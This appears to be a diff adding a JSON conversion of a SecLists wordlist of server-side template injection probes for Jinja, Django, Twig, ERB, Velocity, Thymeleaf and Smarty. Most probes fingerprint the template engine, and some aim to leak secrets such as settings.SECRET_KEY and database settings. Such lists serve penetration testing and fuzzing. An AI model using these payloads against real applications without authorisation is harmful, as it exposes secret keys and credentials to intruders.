@@ -1,0 +1,47 @@
+{
+  "source": "SecLists",
+  "type": "wordlist",
+  "name": "template-engines-special-vars",
+  "payloads": [
+    {
+      "category": "template-engines-special-vars",
+      "escalation": "baseline",
+      "lines": [
+        "1/0",
+        ".version",
+        ".current_template_name",
+        ".locale_object",
+        "self._TemplateReference__context",
+        "settings",
+        "settings.DEBUG",
+        "settings.DATABASES",
+        "settings.SECRET_KEY",
+        "self",
+        "locals",
+        "global",
+        "ERB.version()",
+        "locals()",
+        "globals()",
+        "_self",
+        "_self.getTemplateName().__toString",
+        "_context",
+        "_context|length",
+        "_context|keys|first",
+        "constant('Twig_Environment::VERSION')",
+        "constant('Twig_Environment::VERSION_ID')",
+        "constant('Twig_Environment::EXTRA_VERSION')",
+        "$context.keys",
+        "$context.TOOLS_VERSION",
+        "$field.in(\"org.apache.velocity.runtime.VelocityEngineVersion\")",
+        "$field.in(\"org.apache.velocity.runtime.RuntimeConstants\")",
+        "execInfo",
+        "execInfo.templateStack",
+        "execInfo.templateStack[0].getClass.forName(\"org.thymeleaf.Thymeleaf\").getField(\"VERSION\").get(null)",
+        "$smarty.version",
+        "$smarty.config",
+        "$smarty.template"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.876Z"
+}
